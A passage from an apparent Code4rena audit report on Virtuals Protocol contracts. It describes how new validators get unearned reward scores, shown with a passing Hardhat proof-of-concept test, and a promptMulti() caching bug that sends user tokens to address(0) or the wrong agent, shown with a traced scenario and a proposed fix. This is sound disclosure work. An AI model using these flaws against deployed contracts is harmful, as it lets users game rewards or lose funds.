Without actually casting votes, a new validator is already entitled to rewards, because their score is non-zero. This is unfair to other validators who might have started voting from the beginning but missed 1 proposal. (See POC)</li>
<li>Stakers can game the system by delegating to new validators to maintain 100% reward allocation:</li>
</ol>
<p>In addition to the first scenario above, a staker can delegate to a new validator every time to earn 100% uptime without ever having to vote. </p>
<h3 style="position:relative;" id="impacts"><a class="anchor before" aria-label="impacts permalink" href="#impacts"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Impacts</h3>
<ul>
<li>New validators can earn full rewards without ever voting on proposals.</li>
<li>Stakers can game the system by delegating to new validators to maintain 100% reward allocation.</li>
<li>Unfair reward distribution that penalizes validators who have actively participated since the beginning.</li>
</ul>
<h3 style="position:relative;" id="recommended-mitigation-steps-4"><a class="anchor before" aria-label="recommended mitigation steps 4 permalink" href="#recommended-mitigation-steps-4"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p><code>validatorScore</code> and <code>getPastValidatorScore</code> should be based on actual engagement. For example, consider initializing them to 0 and only taking into account scores earned during their engagement.</p>
<h3 style="position:relative;" id="proof-of-concept-2"><a class="anchor before" aria-label="proof of concept 2 permalink" href="#proof-of-concept-2"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Proof of Concept</h3>
<p>Unit test on exploit scenario (1). Suppose 2 proposals are created. validator 1 votes for the 1st proposal: </p>
<ol>
<li><code>validator2</code> is initialized. <code>validator2</code>’s <code>weight == validator1</code></li>
<li>Check <code>validator2</code>’s score is 2. (100% uptime). Check <code>validator1</code>’s score is 1. 50% uptime.</li>
</ol>
<p>See added unit test <code>validators get unearned score, risk of exploits</code> in <code>test/rewardsV2.js</code>:</p>
<pre data-index="27" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">  it.only("validators get unearned score, risk of exploits", async function () {</span></span>
<span class="grvsc-line"><span class="grvsc-source">    this.timeout(120000); // 120 seconds</span></span>
<span class="grvsc-line"><span class="grvsc-source">    //Test setup: 2 proposal are created. validator 1 votes for the 1st proposal.</span></span>
<span class="grvsc-line"><span class="grvsc-source">    //1. validator2 is initialized. validator2's weight == validator1</span></span>
<span class="grvsc-line"><span class="grvsc-source">    //2. check validator2's score is 2. (100% uptime). check validator1's score is 1. 50% uptime.</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    const base = await loadFixture(deployWithAgent);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const { agentNft, virtualToken, agent } = base;</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const { founder, contributor1, validator1, validator2 } =</span></span>
<span class="grvsc-line"><span class="grvsc-source">      await getAccounts();</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Setup - delegate founder's votes to validator1</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const veToken = await ethers.getContractAt("AgentVeToken", agent.veToken);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await veToken.connect(founder).delegate(validator1.address);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await mine(1);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Create first proposal and have validator1 vote on it</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const proposalId1 = await createContribution(</span></span>
<span class="grvsc-line"><span class="grvsc-source">      1, // virtualId</span></span>
<span class="grvsc-line"><span class="grvsc-source">      0, // coreId</span></span>
<span class="grvsc-line"><span class="grvsc-source">      0, // parentId</span></span>
<span class="grvsc-line"><span class="grvsc-source">      true, // isModel</span></span>
<span class="grvsc-line"><span class="grvsc-source">      0, // no dataset dependency</span></span>
<span class="grvsc-line"><span class="grvsc-source">      "First contribution",</span></span>
<span class="grvsc-line"><span class="grvsc-source">      base,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      contributor1.address,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      [validator1], // Only validator1 votes on this proposal</span></span>
<span class="grvsc-line"><span class="grvsc-source">      [1, 1, 1, 1, 1, 1, 1, 1, 1, 1]</span></span>
<span class="grvsc-line"><span class="grvsc-source">    );</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Create second proposal but nobody votes on it yet</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const proposalId2 = await createContribution(</span></span>
<span class="grvsc-line"><span class="grvsc-source">      1, // virtualId</span></span>
<span class="grvsc-line"><span class="grvsc-source">      0, // coreId</span></span>
<span class="grvsc-line"><span class="grvsc-source">      0, // parentId</span></span>
<span class="grvsc-line"><span class="grvsc-source">      true, // isModel</span></span>
<span class="grvsc-line"><span class="grvsc-source">      0, // no dataset dependency</span></span>
<span class="grvsc-line"><span class="grvsc-source">      "Second contribution",</span></span>
<span class="grvsc-line"><span class="grvsc-source">      base,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      contributor1.address,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      [], // No votes</span></span>
<span class="grvsc-line"><span class="grvsc-source">      [1, 1, 1, 1, 1, 1, 1, 1, 1, 1]</span></span>
<span class="grvsc-line"><span class="grvsc-source">    );</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">// - There are 2 total proposals</span></span>
<span class="grvsc-line"><span class="grvsc-source">    // - validator1 has voted on 1 of 2 (50% participation)</span></span>
<span class="grvsc-line"><span class="grvsc-source">    // 1. initialize validator2 with equal weight</span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Give validator2 some tokens and stake them to get equal voting power</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await virtualToken.mint(validator2.address, parseEther("100000"));</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Register validator2 as a new validator</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await agentNft.addValidator(1, validator2.address);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // 2. Check validator scores</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const validator1Score = await agentNft.validatorScore(</span></span>
<span class="grvsc-line"><span class="grvsc-source">      1,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      validator1.address</span></span>
<span class="grvsc-line"><span class="grvsc-source">    );</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const validator2Score = await agentNft.validatorScore(</span></span>
<span class="grvsc-line"><span class="grvsc-source">      1,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      validator2.address</span></span>
<span class="grvsc-line"><span class="grvsc-source">    );</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const totalProposals = await agentNft.totalProposals(1);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Total proposals:", totalProposals.toString());</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Validator1 score:", validator1Score.toString());</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Validator2 score:", validator2Score.toString());</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Validator1 has base score + 1 vote (has actually participated)</span></span>
<span class="grvsc-line"><span class="grvsc-source">    expect(totalProposals).to.equal(2);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    expect(validator1Score).to.equal(1); // participation (1)</span></span>
<span class="grvsc-line"><span class="grvsc-source">    expect(validator2Score).to.equal(2); // validator2 has base score (2) with no participation</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Calculate uptime percentages</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const validator1Uptime = (validator1Score * 100n) / totalProposals;</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const validator2Uptime = (validator2Score * 100n) / totalProposals;</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Validator1 uptime percentage:", validator1Uptime, "%");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Validator2 uptime percentage:", validator2Uptime, "%");</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // We expect validator2's uptime percentage to be 100% despite not voting on any proposals</span></span>
<span class="grvsc-line"><span class="grvsc-source">    expect(validator2Uptime).to.equal(100);</span></span>
<span class="grvsc-line"><span class="grvsc-source">  });</span></span></code></pre>
<p>Test results:</p>
<pre data-index="28" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">  RewardsV2</span></span>
<span class="grvsc-line"><span class="grvsc-source">Total proposals: 2</span></span>
<span class="grvsc-line"><span class="grvsc-source">Validator1 score: 1</span></span>
<span class="grvsc-line"><span class="grvsc-source">Validator2 score: 2</span></span>
<span class="grvsc-line"><span class="grvsc-source">Validator1 uptime percentage: 50n %</span></span>
<span class="grvsc-line"><span class="grvsc-source">Validator2 uptime percentage: 100n %</span></span>
<span class="grvsc-line"><span class="grvsc-source">    ✔ validators get unearned score, risk of exploits (1547ms)</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">1 passing (2s)</span></span></code></pre>
<p><strong>Virtuals marked as informative</strong></p>
<hr>
<h2 style="position:relative;" id="h-06-missing-prevagentidupdate-in-promptmulti-function-may-cause-token-loss-by-transferring-to-address0"><a class="anchor before" aria-label="h 06 missing prevagentidupdate in promptmulti function may cause token loss by transferring to address0 permalink" href="#h-06-missing-prevagentidupdate-in-promptmulti-function-may-cause-token-loss-by-transferring-to-address0"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-182">[H-06] Missing <code>prevAgentId</code>update in <code>promptMulti()</code> function may cause token loss by transferring to <code>address(0)</code></a></h2>
<p><em>Submitted by <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-379">Vemus</a>, also found by <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-656">4ny0n3</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-578">bareli</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-41">djshan_eden</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-576">dustykid</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-828">harsh123</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-191">Heyu</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-34">ks__xxxxx</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-177">odessos42</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-73">Raihan</a>, and <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-95">sergei2340</a></em></p>
<p><a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/main/contracts/AgentInference.sol#L80-L87">https://github.com/code-423n4/2025-04-virtuals-protocol/blob/main/contracts/AgentInference.sol#L80-L87</a></p>
<h3 style="position:relative;" id="finding-description"><a class="anchor before" aria-label="finding description permalink" href="#finding-description"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding description</h3>
<p>The <code>promptMulti()</code> function attempts to optimize token transfers by caching <code>agentTba</code> when the <code>agentId</code> remains unchanged. However, it fails to update <code>prevAgentId</code> inside the loop, which causes <code>agentTba</code> to remain outdated or uninitialized.</p>
<p>As a result, if the first <code>agentId</code> equals the default <code>prevAgentId</code> (0), the contract never sets <code>agentTba</code> before the first transfer, causing a <code>safeTransferFrom(sender, address(0), amount)</code>, losing the user’s tokens.</p>
<p>Additionally, when the same <code>agentId</code> reoccurs after a different one, <code>agentTba</code> may point to the wrong address, resulting in unexpected transfers.</p>
<h3 style="position:relative;" id="recommended-mitigation-steps-5"><a class="anchor before" aria-label="recommended mitigation steps 5 permalink" href="#recommended-mitigation-steps-5"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>Consider implementing the following version of the code:</p>
<pre data-index="29" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk3">// Initialize prevAgentId to a value that no valid agentId will ever match,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk3">// ensuring the first iteration always enters the if-block.</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">prevAgentId</span><span class="mtk1"> = </span><span class="mtk11">type</span><span class="mtk1">(</span><span class="mtk12">uint256</span><span class="mtk1">).</span><span class="mtk12">max</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk3">// Initialize agentTba to a placeholder; it will be set properly on the first iteration.</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">agentTba</span><span class="mtk1"> = </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">for</span><span class="mtk1"> (</span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">i</span><span class="mtk1"> = </span><span class="mtk7">0</span><span class="mtk1">; </span><span class="mtk12">i</span><span class="mtk1"> &lt; </span><span class="mtk12">len</span><span class="mtk1">; </span><span class="mtk12">i</span><span class="mtk1">++) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">agentId</span><span class="mtk1"> = </span><span class="mtk12">agentIds</span><span class="mtk1">[</span><span class="mtk12">I</span><span class="mtk1">];</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk12">amounts</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">] &gt; </span><span class="mtk7">0</span><span class="mtk1">, </span><span class="mtk8">"Amount must be &gt; 0"</span><span class="mtk1">); </span><span class="mtk3">// Validate if amounts = 0</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">// If the agentId changes, fetch the corresponding agent TBA (target address)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk12">prevAgentId</span><span class="mtk1"> != </span><span class="mtk12">agentId</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">agentTba</span><span class="mtk1"> = </span><span class="mtk12">agentNft</span><span class="mtk1">.</span><span class="mtk11">virtualInfo</span><span class="mtk1">(</span><span class="mtk12">agentId</span><span class="mtk1">).</span><span class="mtk12">tba</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk12">agentTba</span><span class="mtk1"> != </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">), </span><span class="mtk8">"Invalid agent TBA"</span><span class="mtk1">);  </span><span class="mtk3">// Ensure the target address is valid</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">prevAgentId</span><span class="mtk1"> = </span><span class="mtk12">agentId</span><span class="mtk1">;  </span><span class="mtk3">// Update the cache to reflect the current agentId</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">token</span><span class="mtk1">.</span><span class="mtk11">safeTransferFrom</span><span class="mtk1">(</span><span class="mtk12">sender</span><span class="mtk1">, </span><span class="mtk12">agentTba</span><span class="mtk1">, </span><span class="mtk12">amounts</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">]);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">inferenceCount</span><span class="mtk1">[</span><span class="mtk12">agentId</span><span class="mtk1">]++;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">emit</span><span class="mtk1"> </span><span class="mtk11">Prompt</span><span class="mtk1">(</span><span class="mtk12">sender</span><span class="mtk1">, </span><span class="mtk12">promptHashes</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">], </span><span class="mtk12">agentId</span><span class="mtk1">, </span><span class="mtk12">amounts</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">], </span><span class="mtk12">coreIds</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">]);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<h3 style="position:relative;" id="proof-of-concept-3"><a class="anchor before" aria-label="proof of concept 3 permalink" href="#proof-of-concept-3"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Proof of Concept</h3>
<p>Assume the following scenario. The loop processes the following values, controlled by user:</p>
<pre data-index="30" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">agentIds = [0, 1, 0]</span></span>
<span class="grvsc-line"><span class="grvsc-source">amounts  = [10, 20, 30]</span></span></code></pre>
<p><strong>Initialization:</strong></p>
<pre data-index="31" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">prevAgentId = 0</span></span>
<span class="grvsc-line"><span class="grvsc-source">agentTba = address(0)</span></span></code></pre>
<p><strong>Iteration 0:</strong></p>
<pre data-index="32" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">agentId = 0</span></span></code></pre>
<ol>
<li>Check: <code>if (prevAgentId != agentId)</code> → <code>if (0 != 0)</code> → FALSE</li>
<li>No update to <code>agentTba</code> (remains <code>address(0)</code>)</li>
<li>Transfer:</li>
</ol>
<pre data-index="33" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">token</span><span class="mtk1">.</span><span class="mtk11">safeTransferFrom</span><span class="mtk1">(</span><span class="mtk12">sender</span><span class="mtk1">, </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">), </span><span class="mtk7">10</span><span class="mtk1">)</span></span></span></code></pre>
<p>→ User lost 10 tokens unintentionally.</p>
<p><strong>Iteration 1:</strong></p>
<pre data-index="34" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">agentId = 1</span></span></code></pre>
<ol>
<li>Check: <code>if (prevAgentId != agentId)</code> → <code>if (0 != 1)</code> → TRUE</li>
<li><code>agentTba</code> is updated: <code>agentTba = agentNft.virtualInfo(1).tba</code></li>
</ol>
<p>→ BUT: <code>prevAgentId</code> is not updated, so it still holds 0</p>
<ol start="3">
<li>Transfer:</li>
</ol>
<pre data-index="35" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">token</span><span class="mtk1">.</span><span class="mtk11">safeTransferFrom</span><span class="mtk1">(</span><span class="mtk12">sender</span><span class="mtk1">, </span><span class="mtk12">agent1Tba</span><span class="mtk1">, </span><span class="mtk7">20</span><span class="mtk1">)</span></span></span></code></pre>
<p>→ So that’s correct.</p>
<p><strong>Iteration 2:</strong></p>
<pre data-index="36" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">agentId = 0</span></span></code></pre>
<ol>
<li>Check: <code>if (prevAgentId != agentId)</code> → <code>if (0 != 0)</code> → FALSE</li>
<li>No update to <code>agentTba</code>, which still holds the address for agent 1.</li>
<li>Transfer:</li>
</ol>
<pre data-index="37" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">token</span><span class="mtk1">.</span><span class="mtk11">safeTransferFrom</span><span class="mtk1">(</span><span class="mtk12">sender</span><span class="mtk1">, </span><span class="mtk12">agent1Tba</span><span class="mtk1">, </span><span class="mtk7">30</span><span class="mtk1">)</span></span></span></code></pre>
<p>→ Tokens are sent to the wrong agent (agent 1 instead of agent 0).</p>
<h3 style="position:relative;" id="root-cause"><a class="anchor before" aria-label="root cause permalink" href="#root-cause"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Root Cause</h3>
<p>The condition to fetch a new <code>agentTba</code> relies on <code>prevAgentId</code> being updated after each successful fetch.</p>
<ul>
<li>
<p>Because <code>prevAgentId</code> is never updated inside the loop, the caching logic becomes broken:</p>
<ul>
<li>The first transfer may lose tokens (if <code>agentId == 0</code> and no update is triggered),</li>
<li>Subsequent transfers may send tokens to incorrect agents if agentId switches back and forth.</li>
</ul>
</li>
</ul>
<p><strong>Virtuals marked as informative</strong></p>
<hr>
<h1 style="position:relative;" id="medium-risk-findings-26"><a class="anchor before" aria-label="medium risk findings 26 permalink" href="#medium-risk-findings-26"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Medium Risk Findings (26)</h1>
<h2 style="position:relative;" id="m-01-attacker-can-prevent-user-from-executing-application-registered-through-initfromtoken-in-agentfactoryv4"><a class="anchor before" aria-label="m 01 attacker can prevent user from executing application registered through initfromtoken in agentfactoryv4 permalink" href="#m-01-attacker-can-prevent-user-from-executing-application-registered-through-initfromtoken-in-agentfactoryv4"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-2">[M-01] Attacker can prevent user from executing application registered through <code>initFromToken()</code> in <code>AgentFactoryV4</code>.</a></h2>
